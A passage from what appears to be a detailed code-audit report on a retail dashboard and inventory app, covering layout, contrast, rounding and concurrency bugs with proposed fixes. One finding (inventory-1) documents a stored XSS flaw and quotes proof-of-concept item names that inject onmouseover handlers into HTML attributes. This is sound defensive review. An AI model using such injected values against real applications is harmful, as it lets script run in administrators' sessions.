**Evidence.** The store tabs are static markup, `<button data-wrs-tab="BL1" ...>Coliseum</button>` through BL16 (1917-1923). At login WRS_STORE_KEYS is narrowed to the user's scope: `WRS_STORE_KEYS.splice(0, WRS_STORE_KEYS.length, ...WRS_STORE_KEYS.filter(s => allowed.includes(s) || (s === 'BL12' && allowed.includes('BL16'))))` (33518-33522). Nothing hides the matching tabs; the only code touching `.wrs-tab` is renderWrsActiveTab's class toggling (19919-19926). The worker returns only allowed stores (worker.js:20437-20440) and 403s weekly-store-detail for others (20526-20529). So renderWrsStore prints `No data for ${...}` (22224), and on long (lazy) ranges showWrsStorePane prints 'Failed to load South Bend: HTTP 403' (19901).

**Failure scenario.** A Coliseum manager opens Retail on a phone. The tab strip wraps to four rows of seven stores. Tapping any store except Coliseum shows an empty 'No data for South Bend.' or a red 'HTTP 403' error, which looks like a broken page, not a permission boundary.

**Proposed fix.** At the top of renderWrsActiveTab (19919), hide the tabs of stores outside the narrowed roster: `document.querySelectorAll('#wrs-tabs .wrs-tab[data-wrs-tab^="BL"]').forEach(b => b.hidden = !WRS_STORE_KEYS.includes(b.dataset.wrsTab));`. Also fall back to 'summary' if wrsCurrentTab is a hidden store. Check that `.wrs-tab` sets no display that would outrank [hidden]; if it does, add `#wrs-tabs [hidden]{display:none}`.

<a id="weekly-retail-12"></a>
#### weekly-retail-12 — Store tab at 393 px: Retail/Bin/Auction/Net and profit-strip values overflow their tiles by 27–37 px

*medium · minor · ui-ux · confidence high · `index.html:22261` · unverified*

**Evidence.** The store hero tiles are `<div class="mt-4 grid grid-cols-4 gap-2">${chipS('Retail', totals.retail)}...` with the value `text-[14px] font-bold ... ${fmtK(v || 0)}` (22245, 22261). The profit strip is `grid grid-cols-4 gap-2` with `text-[15px] font-extrabold` fmtK values (22267-22273). DESIGN §8 requires exact dollars, so every value is '$30,123.45'-wide. Measured in Chromium at 393×852 with store-sized values: the Retail/Bin/Net tiles are 70 px wide and their values 89 px (overflow 37 px); Auction '$3,209.78' 79 px (27 px); profit strip tiles 80 px against values of 95 px (33 px). Nothing clips or truncates, so the digits run into the next tile.

**Failure scenario.** On an iPhone, a manager opening their store's tab sees '$30,123.45' spilling over into the Bin tile next to it. The four figures they came for are hard to read or misattributed.

**Proposed fix.** Change both grids to `grid grid-cols-2 sm:grid-cols-4 gap-2` (22261 and the profitHtml wrapper at 22268), keeping exact dollars per DESIGN §8. Add `min-w-0` to the tile and `truncate` to the value as a guard. Re-measure at 393 px: `scrollWidth <= clientWidth` for every tile value.

<a id="weekly-retail-13"></a>
#### weekly-retail-13 — Categories with no cost source show 'GPM 100%' in green (and 100.0% in the detail table)

*medium · minor · bug · confidence high · `index.html:22302` · unverified*

**Evidence.** The worker computes `gpmPct: c.net > 0 ? Math.round((gp / c.net) * 1000) / 10 : 0` with `gp = c.net - c.cost` (worker.js:3101, 3130). A category whose cost is 0 because nothing is costed therefore gets 100. The frontend badge takes it at face value: `const cls = g >= 45 ? 'text-accent-green bg-accent-green/15' : ...; return `...GPM ${Math.round(g)}%`` (22302-22306). The table shows `${row.gpmPct != null ? fmtPct(row.gpmPct) : '—'}` (22380), with Gross Profit = net. Per-category coverage is in the payload (`coverage: { item, category, none }`, worker.js:3131) but only feeds the 'Largest uncovered' line (22283). DESIGN §4.8's scorecard rule says missing input must read as absent, never as a confident number. ORIENT notes about $21.6k per 30 days resolves to no cost at all.

**Failure scenario.** A category that is entirely uncovered (e.g., a new L2 with no IM# or category cost) shows a green 'GPM 100%' pill. A buyer reads it as the most profitable line in the store, when its margin is simply unknown. Partly covered categories are inflated the same way.

**Proposed fix.** Frontend: `const costed = c => { const v = c.coverage || {}; return (v.item || 0) + (v.category || 0) > 0; };`. In gpmBadge's caller pass null when `!costed(c)` and render a neutral 'no cost' chip (inkDim). In renderRow show '—' for Ext Cost, Gross Profit and GPM% when `!costed(row)`. Where `coverage.none > 0`, append a small '≈' or 'partial' marker to the GPM badge. The synthetic Auction row (100% by design, no coverage object) needs an explicit exception: `row.category === 'Auction'`.

<a id="weekly-retail-14"></a>
#### weekly-retail-14 — Keyboard and screen readers cannot operate the T13 row expanders, store category rows, T13 store chips or the calendar days

*medium · minor · accessibility · confidence high · `index.html:22034` · unverified*

**Evidence.** T13 rows: `const tap = kids.length ? ` role="button" tabindex="0" class="cursor-pointer ..." onclick="toggleT13L2(...)"` : '';` then `html += `<tr${tap} class="border-b ...">`` (22033-22036). There is a focus stop but no keydown handler and no aria-expanded. The `<tr>` also gets two `class` attributes; the parser keeps the first, so every expandable row loses its `border-b` divider. Store category rows are the same, `role="button" tabindex="0" onclick="toggleL2Expansion(...)"` with no key handler (22315). T13 store filter chips are `<span class="${chipBase} ..." onclick="toggleT13Store(...)">` (21744-21747): not focusable and no pressed state. Calendar day cells (shared by both pickers) are `<div ${future ? '' : `onclick="${pick}('${ymd}')"`} ...>` (19778), so a custom range cannot be picked from the keyboard. DESIGN §9: 'All interactive elements that previously were clickable <span>s were converted to real <button>s'.

**Failure scenario.** A desktop user tabs to the 'Hardlines ▸' row and presses Enter or Space: nothing happens. Screen readers announce a button with no expanded state. The T13 store filter and custom date range can only be used with a mouse or finger.

**Proposed fix.** (1) Rows: add `onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();this.click()}" aria-expanded="${expanded}"` to the T13 `tap` string and the store `tapAttr`. Merge the T13 classes into ONE attribute: `<tr${tapAttrs} class="border-b ... ${kids.length ? 'cursor-pointer hover:...' : ''}">`. (2) Chips: render `<button type="button" aria-pressed="${on}" ...>` instead of `<span>`. (3) Calendar: render days as `<button type="button" ${future ? 'disabled' : ''} aria-label="${ymd}">` with the same classes.

<a id="weekly-retail-15"></a>
#### weekly-retail-15 — In light mode the 'Summary' tab stays green after another tab is selected, so two tabs look active

*low · minor · ui-ux · confidence high · `index.html:19922` · unverified*

**Evidence.** The markup ships Summary with `text-accent-green` (1914). renderWrsActiveTab toggles a DIFFERENT class: `btn.classList.toggle('text-[#3BB54A]', active); ... btn.classList.toggle('text-opl-inkDim', !active);` (19921-19925), so Summary's text-accent-green is never removed. In light, `html:not(.dark) .text-accent-green { color:#166534 }` (150) is (0,2,1) and beats `.text-opl-inkDim` (0,1,0). Measured in Chromium (light, T13 selected): Summary color rgb(22,101,52) with a transparent underline; Categories rgb(107,100,83). Dark is unaffected because `.dark .dark\:text-op-inkDim` wins.

**Failure scenario.** A light-mode user on T13 or a store tab sees 'Summary' in accent green next to the underlined active tab and is unsure which view they are in.

**Proposed fix.** Toggle the token class instead of the literal: `btn.classList.toggle('text-accent-green', active);` in place of `text-[#3BB54A]`. Update the export selectors at 15295/15469 to `.wrs-tab.border-\\[\\#3BB54A\\]` only (the border class still marks the active tab). This also moves the active label from #3BB54A (2.66:1 on white, the item tasks/todo.md lists as left for Brian) to the light-remapped #166534 (7.13:1). If the brand hex must stay, remove text-accent-green from the markup at 1914 instead.

<a id="weekly-retail-16"></a>
#### weekly-retail-16 — Contrast: positive variance text-green-600 is 3.30:1 in light; the Categories ▼ figure uses #ef4444 as dark-theme text (3.88–4.29:1 on its grounds)

*low · minor · accessibility · confidence high · `index.html:17309` · unverified*

**Evidence.** wrsVarianceClass (17307-17310): `n >= 0 ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'`. It is used for T13 '% Budget' (21779, 22099, 22101) and the Summary 'Variance $/%' cells (21579-21580). Computed: #16a34a on opl-panel #ffffff is 3.30:1 and on the panelHi total row #fafaf6 3.15:1 (fail). Red-600 passes (4.83 / 4.62); dark green-400 10.21 and red-400 6.43 pass. Categories: `const ctBad = () => ctIsDark() ? '#ef4444' : '#c0392b';` (20014) is used only as TEXT (ct-head 20799, ct-d 20912, ct-cd 21031). #ef4444 measures 4.73 on bare op-panel but 4.29 on Grid cells (.ct-cell is panelHi #16203a) and 3.88 on a selected row (rgba(34,197,94,.12) over #101826). DESIGN §4.8: 'red TEXT in dark takes #f87171' (5.83 on panelHi). Light values pass (#166534 6.81, #c0392b 5.20 on #fafaf6).

**Failure scenario.** In light mode, 'above budget' percentages in T13 and the store metrics table are hard to read at 3.3:1. In dark, the ▼ % in every Grid panel and on the focused Vs row fails AA.

**Proposed fix.** 17309: `n >= 0 ? 'text-[#166534] dark:text-green-400' : 'text-red-600 dark:text-red-400'`, or use `text-accent-green`, which is already light-remapped to #166534. This is the same family tasks/todo.md parked for 'dashboard delta cells', and this page has more instances than the survey counted. 20014: `const ctBad = () => ctIsDark() ? '#f87171' : '#c0392b';` (text only; the chart fills use CT_COLORS, not ctBad).

<a id="weekly-retail-17"></a>
#### weekly-retail-17 — Sign and rounding glitches: '$-1,234' and '$-0', negatives hidden as '—', '−0.0%', and '100%' in red while under budget

*low · minor · bug · confidence high · `index.html:20021` · unverified*

**Evidence.** `const ctFmt = v => ctState.measure === 'net' ? '$' + Math.round(v).toLocaleString('en-US') : ...` (20021-20023). Run in node: ctFmt(-1234) → '$-1,234' and ctFmt(-0.4) → '$-0' (Intl prints negative zero). This shows in the Trend legend totals, Grid ct-cv, group headers and the table Total column. ctDrawTable `const cell = v => `<td>${v > 0 ? escapeHtml(ctFmt(v)) : '<span class="ct-na">—</span>'}</td>`` (21053) prints a net-refund bucket as '—', which the legend defines as 'no sale', so the row no longer adds up to its Total. ctPct(9999.6, 10000) → '−0.0%' with ▼. The Summary KPI table uses fmtDollar for 'Variance $' (21579), giving '$-30,247.70', while the hero shows '−$30,247.70'. The pace label `Math.round(cPace)` (21525, 21564, 22259) turns 99.6% into '100%' on a red/amber '−$140.00' line.

**Failure scenario.** An L3 with more returns than sales in a week shows '—' in its cell but '$-312' in its Total. The KPI table and hero show the same variance with the minus sign in different places. A store $140 short of budget reads '−$140.00 · 100%' in red.

**Proposed fix.** `const ctFmt = v => { const r = Math.round(v) || 0; const s = Math.abs(r).toLocaleString('en-US'); return (r < 0 ? '−' : '') + (ctState.measure === 'net' ? '$' : '') + s; };`. In ctDrawTable use `v !== 0 ? ctFmt(v) : '—'`. In ctPct return '0.0%' when `Math.abs(q) < 0.0005`. At 21579 use fmtK(t.varianceDollar), which already signs correctly. For pace: `const pctTxt = p => (p < 100 ? Math.floor(p) : Math.round(p)) + '%'`.

<a id="weekly-retail-18"></a>
#### weekly-retail-18 — Pace colours use 95% for amber here but 80% everywhere else (DESIGN §2.1)

*low · minor · ui-ux · confidence high · `index.html:21513` · unverified*

**Evidence.** Retail Summary: `(cAhead ? '#22c55e' : (cPace >= 95 ? '#f59e0b' : '#ef4444'))` (21513), with the same 95 at 21550 (leaderboard) and 22241 (store hero). The dashboard: `v1Pct >= 80 ? V1W : V1B` (10107-10108) and `pct >= 80 ? 'bg-op-warn'` (10536, 10728). DESIGN §2.1 'Pacing semantics': 'Amber when pct >= 80 && pct < 100'.

**Failure scenario.** A store at 90% of budget shows an amber meter on the Dashboard and a red bar on Retail Summary for the same period. Managers read that as two different verdicts.

**Proposed fix.** Replace `>= 95` with `>= 80` at 21513, 21550 and 22241.

<a id="weekly-retail-19"></a>
#### weekly-retail-19 — A failed jsPDF download sticks: every later PDF attempt fails until the app is relaunched

*low · minor · bug · confidence high · `index.html:15274` · unverified*

**Evidence.** loadScript (15272-15279): `if (document.querySelector(`script[src="${src}"]`)) { resolve(); return; }`. A <script> whose onerror fired stays in <head>, so the next attempt resolves immediately without loading anything. downloadWrsAsPdf then shows 'PDF library failed to initialize — please try again.' (15292) every time. If jspdf loaded but autotable failed, the next attempt skips loading entirely because `window.jspdf?.jsPDF` exists (15283), and throws 'PDF generation failed: doc.autoTable is not a function'. The filename date uses `new Date().toISOString().slice(0, 10)` (15455, 15532), which is UTC, so exports after 8 pm ET carry tomorrow's date.

**Failure scenario.** A manager taps PDF in a dead spot in the stockroom and gets 'Failed to load PDF library'. Back on Wi-Fi they try again and get 'please try again' on every attempt until they force-quit the installed PWA.

**Proposed fix.** In loadScript: `s.onerror = e => { s.remove(); reject(e); };`, and only short-circuit when the tag has `data-loaded`, set in onload. In downloadWrsAsPdf, gate on BOTH libraries: `if (!(window.jspdf?.jsPDF) || !(window.jspdf.jsPDF.API?.autoTable)) { ...load both... }`. Use etTodayStr() for the filename date.

<a id="weekly-retail-20"></a>
#### weekly-retail-20 — When budget is 0 the hero and leaderboard show '+$<net sales> of $0.00 budget' in green; the 'No budget set' branch never runs

*low · minor · ui-ux · confidence medium · `index.html:21509` · unverified*

**Evidence.** `const cVar = coT.varianceDollar != null ? coT.varianceDollar : (cBud ? cNet - cBud : null);` (21509). Leaderboard: `r.t.varianceDollar != null ? ...` (21551). Store hero: 22238. The worker always sends a number: `const variance = netSales - budget; ... varianceDollar: roundCents(variance)` (worker.js:99/104 and 3248/3273), and on the long-range company path `varianceDollar: roundCents(cVar)` (20478). So with budget 0, cVar = net and the template renders `${cVarSign}${fmt$0(Math.abs(cVar))} ... of ${fmt$0(cBud)} budget`, never the 'No budget set' text (21525).

**Failure scenario.** For a range or store with no budget rows loaded (a new store, or dates before budgets were entered), the hero reads '+$41,210.33 of $0.00 budget' in green, as if the chain beat its budget by its whole revenue.

**Proposed fix.** Gate on the budget, not on the variance field: `const cVar = cBud > 0 ? (coT.varianceDollar ?? cNet - cBud) : null;` and the same at 21551 (`bud > 0 ? ...`) and 22238 (`sBud > 0 ? ...`). The existing 'No budget set' / '—' branches then render.

<a id="weekly-retail-21"></a>
#### weekly-retail-21 — Phone controls: the tab strip wraps to 4 rows, the Categories control bar is 360 px tall, controls are 27–29 px high, and an 11 px select triggers iOS zoom

*low · minor · ui-ux · confidence high · `index.html:1913` · unverified*

**Evidence.** `<nav id="wrs-tabs" class="flex flex-wrap gap-1 ...">` holds 10 tabs of `px-4 py-2 text-sm` (1913-1923). Measured at 393 px: 4 rows, each tab 38 px tall. Categories: `.ct-pill button{...font-size:11px;padding:4px 10px...}` and `.ct-chip{...padding:4px 11px}` (5386, 5394). Measured: pills 27 px, store chips 27 px, range chips 29 px, and #ct-bar 360 px tall at 393 px, most of the first screen before any data. `select.ct-sel{...font-size:11px...}` (5401) computes to 11px, and iOS Safari zooms the page when a select under 16px is focused. The T13 chips are `px-3 py-1.5 text-xs` (21739), about 30 px.

**Failure scenario.** On an iPhone the Retail header plus four rows of tabs push content below the fold. On Categories a manager scrolls past a 360 px wall of 27 px pills to reach the chart, mis-taps neighbouring pills, and the page zooms in when they open 'Within'.

**Proposed fix.** (1) Tabs: `flex flex-nowrap overflow-x-auto no-scrollbar` with `whitespace-nowrap` on each tab. This matches DESIGN §7's horizontally scrolling day chips. (2) In the existing `@media (max-width:640px)` block (5519): `.ct-pill button,.ct-chip,.ct-range{min-height:36px}` and `select.ct-sel{font-size:16px}`. (3) Put the rarer controls (Compare to, X-axis, Scale) behind a 'More' disclosure on phones so #ct-bar shows Level, Showing, Compared with and View.

<a id="weekly-retail-22"></a>
#### weekly-retail-22 — On the Categories tab the page-level Date Range chip does nothing, but it stays visible next to a different range

*low · minor · ui-ux · confidence high · `index.html:20128` · unverified*

**Evidence.** ctRangeA seeds from its own preset and ignores wrsRange: `if (!ctA) { const r = resolvePreset('thisWeek'); ctA = {...}; }` (20128-20131). The header chip (1860-1886) and subtitle (19862) keep showing wrsRange. setWrsRange (19705-19713) still runs on that tab, fetching weekly-summary and clearing the category memo, but the panel's 'Showing' chip does not change.

**Failure scenario.** An admin on Categories picks 'Last Month' in the page header. The subtitle changes to 'Last Month · Aug 1 – 31', the panel still compares Sep 20–22 against Sep 13–15, and two requests go out for nothing. The page shows two different 'current' ranges with no explanation.

**Proposed fix.** Either seed A from the page range until the user sets A explicitly: in setWrsRange, `if (!ctAUserSet) { ctA = { from: r.from, to: r.to, label: r.label, presetId: r.presetId }; }` (set ctAUserSet = true in ctSetRange('a')). Or dim the header chip while wrsCurrentTab === 'categories', with a title of 'Categories has its own range below'. The first is closer to how the rest of the page behaves.

<a id="weekly-retail-23"></a>
#### weekly-retail-23 — Leaderboard ranks closed Holland and Wyoming with red 0% bars and no 'Closed' pill

*low · minor · ui-ux · confidence medium · `index.html:21559` · unverified*

**Evidence.** The leaderboard iterates every WRS_STORE_KEYS entry (21538-21566) and colours by pace: `(ahead ? '#22c55e' : (pace >= 95 ? '#f59e0b' : '#ef4444'))`. It never consults `CLOSED_STORES = { BL8: '2026-07-25', BL12: '2026-06-15' }` (7535). Only the store hero shows the 'Closed · historical' pill (22253). Holland keeps its budget by design (tasks/lessons.md 2026-09-16), so it ranks near the bottom with net $0 and a red '−$budget · 0%'.

**Failure scenario.** An executive reviewing This Week sees Holland at 0% of budget in red and assumes a data outage or a disastrous week, when the store has been closed since July.

**Proposed fix.** In the leaderboard row, after the store name (21561), add the same pill the store hero uses when `CLOSED_STORES[r.s]` is set and the range starts on or after that date. Draw its bar in inkDimmer rather than red, e.g. `const closed = CLOSED_STORES[r.s] && wrsRange.from >= CLOSED_STORES[r.s];`.

<a id="weekly-retail-24"></a>
#### weekly-retail-24 — T13, Summary matrix and store detail tables don't follow DESIGN §4.8 (no legend for the heat tint, no level badges or sticky header, legacy gray palette)

*low · major · ui-ux · confidence high · `index.html:22393` · unverified*

**Evidence.** The store detail table is on the pre-redesign palette: `<div class="bg-white dark:bg-gray-800 rounded-xl shadow-sm border border-gray-100 dark:border-gray-700 ...">`, `thCls = '... text-gray-500 dark:text-gray-400 ...'` and L3 rows `bg-gray-50 dark:bg-gray-700/30` (22345-22366, 22393-22415). In dark that is #1f2937 inside #101826 panels. The T13 cards (22001-22013) and the L2×Store matrix (21635-21644) shade cells `style="background:rgba(34,197,94,${a})"` (21979, 21629) with no legend saying what the tint encodes. L3 rows are told apart only by a `pl-7` indent: no `.mc-lvl` badges and no `::before` rule back to the parent. Header rows are not sticky, and 13-week tables lose their column labels on vertical scroll. §4.8 lists each of these (panel+bar+legend, level badges, sticky header, 'every visual state the table uses gets a row in it'), and the Categories Table view on this same page already follows it (21058-21070, 5481-5498).

**Failure scenario.** A user moving between Categories → Table and T13 sees two table languages for the same L2/L3 hierarchy. Green shading on T13 and the matrix has to be guessed at (volume? good?). In dark mode the store detail table shows as a grey box inside navy panels.

**Plan.** FUTURE PLAN (frontend only; no worker or API change, so there is no deploy-order constraint and Pages publishes on merge). 1) Move the T13 cards and store table styles into a `wrs-` stylesheet built from the §4.8 token literals, both themes stated on the panel, reusing #ct-tbl's rules (sticky thead, sticky .k column with an opaque bg, .ct-l3 ::before rule, .mc-lvl badges). 2) Give each card a bar (label + its controls: Expand all, Contribution/Penetration; move the T13 store chips into the first card's bar) and a legend row (heat tint = share of the largest cell on this card; '—' = no sales; italic = uncategorised remainder). 3) Swap the store detail table's gray-* classes for op/opl tokens. 4) Exporters read `<table>`, so keep the markup a <table> and re-run the CSV/PDF on T13 and a store tab. Risks: exporter selectors (`.rounded-xl` / `bg-gray-50` total detection at 15389/15404) depend on the current classes, so update them in the same change. Verify: contrast computed on panel/panelHi in light, dark and OLED (≥4.5:1); browser harness at 393 px and 1280 px; §4.8 traps 2, 3, 7 and 8 (sticky bg, colour on the panel, second render after an expand toggle).

</details>

<a id="inventory"></a>
### Inventory (Add / Viewer / Sale)

The three Inventory pages follow DESIGN.md §4.8 closely: panel, bar, legend, sticky column, and token colours that were measured. The code also gets a lot right: write buttons are disabled synchronously, uiConfirm is used, the duplicate guard fails closed, the L3→L2 mapping is additive only, and an unknown margin shows as an em dash rather than 0%. Six serious problems remain, and four of them I reproduced by running the code offline. (1) Clover item names are written into HTML attributes without quote escaping, including a single-quoted onclick that holds the item as JSON. This is stored XSS: an injected handler ran on hover in Chromium. It also breaks Edit for any name with an apostrophe. (2) create-clover-item overwrites the shared IM# cost table and writes a global L3 mapping even when every store was skipped as a duplicate (driven through the real handler), while the page says "nothing changed". (3) Clicking Load twice doubles the catalog and flags every code as a duplicate. (4) Saving the Edit modal overwrites `sku` with `code`, and wipes it when the code is empty, which destroys sticker numbers in stores that keep them in `sku`. (5) The redesign removed the only button that opened Delete, while Brian still has five duplicates to delete. (6) Schedule Sale offers six locations but sends one store's Clover item ids, which exist only in that one store, so the other stores error at start time. On the scheduler side: an active sale with one errored item can no longer be cancelled from the UI; the time conversion shifts New Year's Eve and Day sales by 1–2 hours; and 50 parallel Clover calls per tick risk 429s that leave items stuck at the sale price. For speed, the Viewer rebuilds about 1.7 MB of HTML on every keystroke, which measured 370–900 ms per key at 1,100 items on this machine with no CPU throttling. Contrast in dark mode is mostly fine. The exceptions are hidden rows at 55% opacity, and the inputs, which are under 16px and make iOS zoom in on focus.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [inventory-1](#inventory-1) | high | minor | security | Stored XSS / broken Edit: Clover item names interpolated into HTML attributes without quote escaping (incl. JSON in a single-quoted onclick) | `index.html:30940` | **fixed 2026-09-24** |
| [inventory-2](#inventory-2) | high | minor | bug | create-clover-item overwrites the shared IM# cost table and writes a global L3 mapping even when nothing was created | `worker.js:19983` | unverified |
| [inventory-3](#inventory-3) | high | minor | bug | Overlapping loadInventory calls share one global array: a double-click on Load doubles the catalog and flags every code as a duplicate | `index.html:30803` | unverified |
| [inventory-4](#inventory-4) | high | minor | bug | Saving the Edit modal overwrites the item's `sku` with `code`, and wipes both when the code is empty | `index.html:31191` | unverified |
| [inventory-5](#inventory-5) | high | minor | bug | Delete is unreachable: the redesign dropped the row's Del button, so openDeleteModal has no caller | `index.html:31223` | **fixed 2026-09-24** |
| [inventory-6](#inventory-6) | high | minor | bug | Schedule Sale offers six locations but sends one store's Clover item ids; every other store's rows fail at activation | `index.html:31535` | unverified |
| [inventory-7](#inventory-7) | medium | minor | bug | An active sale with one errored item shows 'Remove' instead of 'Cancel & restore', so it cannot be cancelled; Remove also deletes error history without confirmation | `index.html:31612` | unverified |
| [inventory-8](#inventory-8) | medium | minor | bug | Changing the Viewer's store select does not reload; Edit, Schedule sale and Find duplicates then act on the new store with the old store's rows | `index.html:2404` | **fixed 2026-09-24** |
| [inventory-9](#inventory-9) | medium | minor | bug | Sale fan-out uses Promise.all, so one store's network error hides the stores that succeeded; partial failures don't name the store and clear the selection | `index.html:31541` | unverified |
| [inventory-10](#inventory-10) | medium | minor | bug | Scheduler fires up to 50 Clover item reads and writes at once on one merchant; a 429 on revert marks the row 'error', which is never retried, leaving the item at sale price | `worker.js:1619` | unverified |
| [inventory-11](#inventory-11) | medium | minor | bug | etLocalToDate is wrong across the year boundary: a New Year's Day sale starting 00:00 starts at 22:00 on Dec 31; one ending Dec 31 23:59 runs until ~01:00 | `index.html:31442` | unverified |
| [inventory-12](#inventory-12) | medium | minor | ui-ux | $-off or deep discounts silently floor items at $0.01, and $0 items preview as '−-Infinity%'; nothing warns before submit | `index.html:31494` | unverified |
| [inventory-13](#inventory-13) | medium | minor | bug | Item created in Clover but category link failed is reported as 'Failed — nothing was created'; a retry then skips it as a duplicate | `worker.js:19968` | unverified |
| [inventory-14](#inventory-14) | medium | minor | bug | Built-in categories whose reporting group is not in the L2 dropdown (Sku Book Items, MI Bottle/Can Deposit, Custom Sales, Refund) lock the form in an unsubmittable state | `index.html:31014` | unverified |
| [inventory-15](#inventory-15) | medium | minor | bug | After a successful create, the previous L2 stays selected and the margin read-outs stay stale, so the next item can inherit a wrong chain-wide mapping; the button is relabelled 'Add Item' | `index.html:30756` | unverified |
| [inventory-16](#inventory-16) | medium | minor | bug | Edit modal lets the code be changed to one already in use; the create path's duplicate guard is bypassed | `index.html:31177` | unverified |
| [inventory-17](#inventory-17) | medium | minor | ui-ux | Edit modal's 'Clover category' only ADDS a category, so a recategorisation looks done but doesn't take; cost edits don't reach the reporting cost table | `index.html:31193` | unverified |
| [inventory-18](#inventory-18) | medium | minor | bug | Items whose number lives in `sku` are invisible to the Viewer's Code column, search and code sort, so 'Open in Viewer' from a skipped create shows 'Nothing matches' | `index.html:30874` | unverified |
| [inventory-19](#inventory-19) | medium | minor | ui-ux | After scheduling, the log reloads BL1 (the select's default) rather than the store just scheduled, and the success message is cleared 1.2 s later | `index.html:31557` | unverified |
| [inventory-20](#inventory-20) | medium | minor | performance | The Viewer rebuilds the whole table (≈1.5 KB of HTML per row) on every search keystroke: 370–900 ms per key at 1,100 items unthrottled, 6–7 s at 5,000 on a 4× slower CPU | `index.html:2412` | unverified |
| [inventory-21](#inventory-21) | medium | minor | ui-ux | Phone: every Inventory input is 12.5–13.5px, so iOS zooms the page on focus; key tap targets are 14–31px | `index.html:2007` | unverified |
| [inventory-24](#inventory-24) | medium | minor | bug | Delete modal's 'Also delete from every other location' deletes nothing and reports success (latent until inventory-5 rewires Delete) | `index.html:31244` | **fixed 2026-09-24** |
| [inventory-25](#inventory-25) | low | minor | bug | The Edit modal's category datalist is appended to on every open and never cleared; openEditModal also repopulates the Add page's datalist with the Viewer's store | `index.html:30633` | unverified |
| [inventory-26](#inventory-26) | low | minor | accessibility | Hidden-item rows dim text with opacity .55, failing AA in both themes (light 2.33–4.16:1, dark 2.62–3.30:1) | `index.html:2135` | unverified |
| [inventory-27](#inventory-27) | low | minor | accessibility | Keyboard/screen-reader gaps: sortable headers are click-only <th>, modals have no dialog semantics, focus or Escape, status strips aren't live, and the discount input has no label | `index.html:2428` | unverified |
| [inventory-28](#inventory-28) | low | minor | ui-ux | Ticking a row doesn't apply the green 'Selected for a sale' tint the legend promises until the next full render | `index.html:31298` | unverified |
| [inventory-29](#inventory-29) | low | minor | ui-ux | Dark mode: inline light-theme borders on the Preview bar and legend swatches can't be overridden by the dark rules | `index.html:2536` | unverified |
| [inventory-22](#inventory-22) | low | major | bug | Sale activation/revert is not idempotent: rows aren't claimed before the Clover write, so overlapping runs or a failed D1 update double-discount and later 'revert' to the sale price | `worker.js:1585` | unverified |
| [inventory-23](#inventory-23) | low | major | bug | create-clover-item's duplicate guard is still read-then-write with no lock: two concurrent submits (two tabs/admins, or a retry while the first is still running) can both create | `worker.js:19940` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="inventory-1"></a>
#### inventory-1 — Stored XSS / broken Edit: Clover item names interpolated into HTML attributes without quote escaping (incl. JSON in a single-quoted onclick)

*high · minor · security · confidence high · `index.html:30940` · unverified · fixed 2026-09-24*

**Status (2026-09-24).** Fixed in renderInvTable: every attribute goes through `invEsc`, which also escapes `"`, and Edit and Delete look the item up by id instead of inlining it as JSON. Fixed as well in Schedule Sale's chips, preview and log, because the whole name now reaches them. Until then the row cut it off at the first `"`. `scripts/browser-inventory-delete.mjs` §7 plants one name per quote style and checks every place it lands. **Finished later the same day:**
- Add Item's "Open in Viewer" passes the store and the typed code as JSON through `invEsc`. A code holding both quotes used to throw `SyntaxError` on click.
- The Viewer's load error and Edit's save error wrap `data.error` in `escapeHtml`. That text is Clover's raw body, or, for Edit, a typed category name echoed back.
- `browser-inventory-delete.mjs` §7b fails without each of the three fixes.

**Evidence.** index.html:30940 `<button ... onclick='openEditModal(${JSON.stringify(item)})'>Edit</button>` — JSON.stringify does not escape `'`, and the attribute is single-quoted. index.html:30930-30932 `data-item-name="${nm}"`, `aria-label="Select ${nm}"`, `title="${nm}"` where `nm = escapeHtml(item.name)`; escapeHtml (index.html:7753) is textContent→innerHTML, which escapes & < > but NOT quotes. Same pattern at 31370-31374 (sale chips), 31621/31627 (schedule log title), 30709 (`onclick="invOpenInViewer('${escapeHtml(r.store)}','${escapeHtml(code)}')"`). Raw Clover error text also goes into innerHTML via invStrip at 30817/31205/31256. Verified in Chromium by rendering the sliced renderInvTable: name `x' onmouseover='window.viaQuote=1' y='` and name `z" onmouseover="window.viaDouble=1` both executed on hover ({viaQuoteInEditButton:1, viaDoubleQuoteInTrAttr:1}); a plain "Men's Tee" row threw `SyntaxError: Invalid or unexpected token` on Edit and `55" Smart TV` was stored in the selection as `"55"`.

**Failure scenario.** Anyone who can rename an item in Clover (store staff on the POS or Clover dashboard) sets a name containing `" onmouseover="...`. When a superuser or admin loads that store in the Inventory Viewer and moves the mouse over the row, the script runs in their session and can call any admin or destructive endpoint. Separately, Edit silently does nothing for every item with an apostrophe (Men's, Women's, Kellogg's…). An inch mark in a name (55" TV) truncates the name carried into the sale composer and saved as item_name in D1.

**Proposed fix.** Frontend only, about 20 lines. Add `const invAttr = s => escapeHtml(s ?? '').replace(/"/g,'&quot;').replace(/'/g,'&#39;');` and use it for every attribute interpolation in renderInvTable, invLoadSaleComposer, loadSaleSchedules and the results rows. Replace the Edit handler with an id lookup: `onclick="invEditById(${invAttr(JSON.stringify(item.id))})"` plus `function invEditById(id){ const it = invViewAllItems.find(i => i.id === id); if (it) openEditModal(it); }`. Build the Open in Viewer handler the same way: `onclick="invOpenInViewer(${invAttr(JSON.stringify(r.store))},${invAttr(JSON.stringify(code))})"`. Wrap `data.error` in escapeHtml at 30817, 31205 and 31256. Verify by re-rendering the three names above and asserting that no handler fires and Edit opens for "Men's Tee".

<a id="inventory-2"></a>
#### inventory-2 — create-clover-item overwrites the shared IM# cost table and writes a global L3 mapping even when nothing was created

*high · minor · bug · confidence high · `worker.js:19983` · unverified*

